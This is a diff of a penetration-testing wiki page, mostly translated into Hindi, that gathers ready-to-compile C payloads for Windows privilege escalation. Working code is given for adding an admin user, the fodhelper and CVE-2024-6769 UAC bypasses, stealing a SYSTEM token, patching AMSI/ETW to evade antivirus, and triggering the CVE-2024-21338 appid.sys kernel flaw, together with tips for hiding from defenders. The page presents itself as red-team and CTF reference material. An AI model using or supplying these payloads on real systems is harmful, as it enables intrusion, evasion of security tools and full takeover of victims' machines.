@@ -2,13 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-This page collects **small, self-contained C snippets** that are handy during Windows Local Privilege Escalation or post-exploitation.  Each payload is designed to be **copy-paste friendly**, requires only the Windows API / C runtime, and can be compiled with `i686-w64-mingw32-gcc` (x86) or `x86_64-w64-mingw32-gcc` (x64).
+यह पृष्ठ उन छोटे, स्व-निहित C स्निपेट्स को एकत्र करता है जो Windows Local Privilege Escalation या post-exploitation के दौरान उपयोगी होते हैं। प्रत्येक payload को इस तरह डिज़ाइन किया गया है कि वे **कॉपी-पेस्ट-फ्रेंडली** हों, केवल Windows API / C runtime की आवश्यकता हो, और इन्हें `i686-w64-mingw32-gcc` (x86) या `x86_64-w64-mingw32-gcc` (x64) से कंपाइल किया जा सके।
 
-> ⚠️  ये payloads यह मानते हैं कि प्रक्रिया के पास पहले से ही वह न्यूनतम privileges मौजूद हैं जो क्रिया करने के लिए आवश्यक हैं (उदा. `SeDebugPrivilege`, `SeImpersonatePrivilege`, या medium-integrity context for a UAC bypass)। ये **red-team or CTF settings** के लिए हैं जहाँ किसी vulnerability का फायदा उठाकर arbitrary native code execution प्राप्त हुआ होता है।
+> ⚠️  ये payloads मानते हैं कि प्रक्रिया के पास पहले से ही वह न्यूनतम privileges हैं जो क्रिया करने के लिए आवश्यक होते हैं (उदा. `SeDebugPrivilege`, `SeImpersonatePrivilege`, या UAC bypass के लिए medium-integrity context)। इन्हें उन **red-team या CTF सेटिंग्स** के लिए बनाया गया है जहाँ किसी vulnerability का exploit करके arbitrary native code execution मिल चुकी हो।
 
 ---
 
-## Add local administrator user
+## स्थानीय व्यवस्थापक उपयोगकर्ता जोड़ें
 ```c
 // i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
 #include <stdlib.h>
@@ -21,9 +21,9 @@ return 0;
 ---
 
 ## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
-जब भरोसेमंद बाइनरी **`fodhelper.exe`** चलती है, यह नीचे दिए गए रजिस्ट्री पाथ को **`DelegateExecute` verb को फ़िल्टर किए बिना** क्वेरी करता है। उस कुंजी के अंतर्गत हमारा कमांड रखकर एक हमलावर UAC को *बिना* डिस्क पर फ़ाइल ड्रॉप किए बायपास कर सकता है।
+जब trusted binary **`fodhelper.exe`** चलाया जाता है, यह नीचे दिए गए registry path को query करता है **बिना `DelegateExecute` verb को filter किए।** उस key के अंतर्गत हमारी कमांड लगाने से attacker UAC को bypass कर सकता है *बिना* डिस्क पर फ़ाइल ड्रॉप किए।
 
-*रजिस्ट्री पाथ जिसे `fodhelper.exe` क्वेरी करता है*
+*Registry path queried by `fodhelper.exe`*
 ```
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
@@ -61,12 +61,78 @@ system("fodhelper.exe");
 return 0;
 }
 ```
-*Windows 10 22H2 और Windows 11 23H2 (July 2025 patches) पर परीक्षण किया गया। बायपास अभी भी काम कर रहा है क्योंकि Microsoft ने `DelegateExecute` पथ में गायब integrity check को ठीक नहीं किया है।*
+*Windows 10 22H2 और Windows 11 23H2 (July 2025 patches) पर परीक्षण किया गया। bypass अभी भी काम करता है क्योंकि Microsoft ने `DelegateExecute` path में गायब integrity check को ठीक नहीं किया है।*
 
 ---
 
-## टोकन डुप्लिकेशन के माध्यम से SYSTEM shell लॉन्च करें (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
-यदि वर्तमान प्रक्रिया के पास **दोनों** `SeDebug` और `SeImpersonate` privileges हैं (कई service accounts के लिए सामान्य), तो आप `winlogon.exe` से token चुरा कर उसे डुप्लिकेट कर सकते हैं और एक elevated process शुरू कर सकते हैं:
+## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
+Drive remapping + activation context cache poisoning patched Windows 10/11 builds के खिलाफ अभी भी काम करता है क्योंकि `ctfmon.exe` एक high-integrity trusted UI process के रूप में चलता है जो caller के impersonated `C:` drive से खुशी-खुशी लोड करता है और `CSRSS` द्वारा cached किसी भी DLL redirections को reuse कर लेता है। Abuse इस प्रकार होता है: `C:` को attacker-controlled storage की ओर repoint करें, एक trojanized `msctf.dll` डालें, high integrity पाने के लिए `ctfmon.exe` लॉन्च करें, फिर `CSRSS` से एक manifest cache करने के लिए कहें जो auto-elevated binary (उदाहरण के लिए, `fodhelper.exe`) द्वारा उपयोग की जाने वाली DLL को redirect करे ताकि अगली बार लॉन्च पर आपका payload बिना UAC prompt के inherit हो जाए।
+
+Practical workflow:
+1. एक fake `%SystemRoot%\System32` tree तैयार करें और उस वैध binary की कॉपी रखें जिसे आप hijack करने का प्लान कर रहे हैं (अक्सर `ctfmon.exe`)।
+2. अपने process के अंदर `C:` को remap करने के लिए `DefineDosDevice(DDD_RAW_TARGET_PATH)` का उपयोग करें, और `DDD_NO_BROADCAST_SYSTEM` रखें ताकि बदलाव local ही रहें।
+3. अपना DLL + manifest फेक tree में रखें, manifest को activation-context cache में धकेलने के लिए `CreateActCtx/ActivateActCtx` कॉल करें, फिर auto-elevated binary लॉन्च करें ताकि वह redirected DLL को सीधे आपके shellcode में resolve कर ले।
+4. काम खत्म होने पर cache entry (`sxstrace ClearCache`) हटाएँ या attacker fingerprints मिटाने के लिए reboot करें।
+
+<details>
+<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
+```c
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <shlwapi.h>
+#pragma comment(lib, "shlwapi.lib")
+
+BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
+HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+if (h == INVALID_HANDLE_VALUE) return FALSE;
+DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
+BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
+CloseHandle(h);
+return ok;
+}
+
+int wmain(void) {
+const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
+SHCreateDirectoryExW(NULL, stage, NULL);
+CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
+CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);
+
+DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
+L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
+
+const wchar_t manifest[] =
+L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
+L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
+L" <dependency><dependentAssembly>"
+L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
+L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
+L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
+L" </dependentAssembly></dependency></assembly>";
+WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);
+
+ACTCTXW act = { sizeof(act) };
+act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
+ULONG_PTR cookie = 0;
+HANDLE ctx = CreateActCtxW(&act);
+ActivateActCtx(ctx, &cookie);
+
+STARTUPINFOW si = { sizeof(si) };
+PROCESS_INFORMATION pi = { 0 };
+CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+WaitForSingleObject(pi.hProcess, 2000);
+DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
+return 0;
+}
+```
+</details>
+
+क्लीनअप टिप: popping SYSTEM के बाद परीक्षण करते समय `sxstrace Trace -logfile %TEMP%\sxstrace.etl` चलाएँ और उसके बाद `sxstrace Parse` — यदि आप लॉग में अपना manifest नाम देखते हैं, तो defenders भी देख सकते हैं, इसलिए हर रन पर paths बदलें।
+
+---
+
+## token duplication के जरिए SYSTEM shell प्राप्त करें (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
+यदि वर्तमान प्रक्रिया के पास **दोनों** `SeDebug` और `SeImpersonate` privileges हैं (कई service accounts के लिए सामान्य), तो आप `winlogon.exe` से token चुरा सकते हैं, उसे duplicate कर सकते हैं, और एक elevated process शुरू कर सकते हैं:
 ```c
 // x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
 #include <windows.h>
@@ -114,7 +180,7 @@ if (dupToken) CloseHandle(dupToken);
 return 0;
 }
 ```
-For a deeper explanation of how that works see:
+उसके काम करने के तरीके की विस्तृत व्याख्या के लिए देखें:
 
 {{#ref}}
 sedebug-+-seimpersonate-copy-token.md
@@ -122,8 +188,8 @@ sedebug-+-seimpersonate-copy-token.md
 
 ---
 
-## इन-मेमोरी **AMSI** & **ETW** Patch (Defence Evasion)
-अधिकांश आधुनिक AV/EDR इंजन दुर्भावनापूर्ण व्यवहारों की जाँच के लिए **AMSI** और **ETW** पर निर्भर करते हैं। वर्तमान प्रक्रिया के भीतर जल्दी दोनों इंटरफ़ेस को पैच करने से स्क्रिप्ट-आधारित payloads (जैसे PowerShell, JScript) को स्कैन किए जाने से रोका जाता है।
+## मेमोरी में AMSI & ETW पैच (Defence Evasion)
+अधिकांश आधुनिक AV/EDR इंजन दुर्भावनापूर्ण व्यवहारों की जांच के लिए **AMSI** और **ETW** पर निर्भर करते हैं। वर्तमान प्रक्रिया के अंदर दोनों इंटरफेस को जल्दी पैच करने से script-based payloads (e.g. PowerShell, JScript) को स्कैन होने से रोका जा सकता है।
 ```c
 // gcc -o patch_amsi.exe patch_amsi.c -lntdll
 #define _CRT_SECURE_NO_WARNINGS
@@ -150,12 +216,12 @@ MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
 return 0;
 }
 ```
-*ऊपर दिया गया पैच process-local है; इसे चलाने के बाद नया PowerShell शुरू करने पर वह AMSI/ETW निरीक्षण के बिना चलेगा।*
+*ऊपर किया गया पैच प्रोसेस-लोकल है; इसे चलाने के बाद नया PowerShell शुरू करने पर AMSI/ETW निरीक्षण के बिना चलेगा।*
 
 ---
 
-## बच्चे को Protected Process Light (PPL) के रूप में बनाएं
-बच्चे के निर्माण के समय उसके लिए PPL protection level का अनुरोध `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` का उपयोग करके करें। यह एक documented API है और यह केवल तब सफल होगा जब target image अनुरोधित signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb) के लिए signed हो।
+## चाइल्ड को Protected Process Light (PPL) के रूप में बनाएँ
+बनाने के समय `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` का उपयोग करके चाइल्ड के लिए PPL protection level का अनुरोध करें। यह एक दस्तावेजीकृत API है और केवल तभी सफल होगा जब टार्गेट इमेज अनुरोधित signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb) के लिए signed हो।
 ```c
 // x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
 #include <windows.h>
@@ -187,19 +253,73 @@ CloseHandle(pi.hProcess);
 return 0;
 }
 ```
-सबसे सामान्य रूप से उपयोग किए जाने वाले स्तर:
+Levels used most commonly:
 - `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
 - `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
 - `PROTECTION_LEVEL_LSA_LIGHT` (4)
 
-Process Explorer/Process Hacker में Protection कॉलम की जाँच करके परिणाम को सत्यापित करें।
+Process Explorer/Process Hacker में Protection column को चेक करके परिणाम सत्यापित करें।
+
+---
+
+## Local Service -> Kernel के जरिए `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
+`appid.sys` एक device object (`\\.\\AppID`) प्रदर्शित करता है जिसका smart-hash maintenance IOCTL user-supplied function pointers स्वीकार करता है जब भी caller `LOCAL SERVICE` के रूप में चलता है; Lazarus इसका दुरुपयोग PPL को disable करने और arbitrary drivers को load करने के लिए कर रहा है, इसलिए red teams को lab उपयोग के लिए एक तैयार trigger रखना चाहिए।
+
+ऑपरेशनल नोट्स:
+- आपको अभी भी एक `LOCAL SERVICE` token की आवश्यकता है। इसे `SeImpersonatePrivilege` का उपयोग करके `Schedule` या `WdiServiceHost` से चुराएं, फिर डिवाइस को छूने से पहले impersonate करें ताकि ACL जांच पास हो सके।
+- IOCTL `0x22A018` एक struct की अपेक्षा करता है जिसमें दो callback pointers होते हैं (query length + read function)। दोनों को user-mode stubs की ओर पॉइंट करें जो token overwrite बनाते हैं या ring-0 primitives को मैप करते हैं, लेकिन buffers को RWX रखें ताकि KernelPatchGuard chain के बीच में crash न करे।
+- सफलता के बाद, impersonation से बाहर निकलें और device handle को revert करें; defenders अब असामान्य `Device\\AppID` handles की तलाश करते हैं, इसलिए privilege प्राप्त होते ही इसे तुरंत बंद कर दें।
+
+<details>
+<summary>C - `appid.sys` smart-hash दुरुपयोग के लिए स्केलेटन ट्रिगर</summary>
+```c
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <stdio.h>
+
+typedef struct _APPID_SMART_HASH {
+ULONGLONG UnknownCtx[4];
+PVOID QuerySize;   // called first
+PVOID ReadBuffer;  // called with size returned above
+BYTE  Reserved[0x40];
+} APPID_SMART_HASH;
+
+DWORD WINAPI KernelThunk(PVOID ctx) {
+// map SYSTEM shellcode, steal token, etc.
+return 0;
+}
+
+int wmain(void) {
+HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+if (hDev == INVALID_HANDLE_VALUE) {
+printf("[-] CreateFileW failed: %lu\n", GetLastError());
+return 1;
+}
+
+APPID_SMART_HASH in = {0};
+in.QuerySize = KernelThunk;
+in.ReadBuffer = KernelThunk;
+
+DWORD bytes = 0;
+if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
+printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
+}
+CloseHandle(hDev);
+return 0;
+}
+```
+</details>
+
+एक weaponized बिल्ड के लिए न्यूनतम फिक्स-अप: `VirtualAlloc` के साथ एक RWX सेक्शन मैप करें, अपना token duplication stub वहाँ कॉपी करें, `KernelThunk = section` सेट करें, और जब `DeviceIoControl` लौटेगा तो आपको PPL के तहत भी SYSTEM होना चाहिए।
 
 ---
 
 ## संदर्भ
 * Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
 * SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
-* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
+* CreateProcessAsPPL – न्यूनतम PPL प्रोसेस लॉन्चर: https://github.com/2x7EQ13/CreateProcessAsPPL
 * Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
+* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
+* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)
 
 {{#include ../../banners/hacktricks-training.md}}
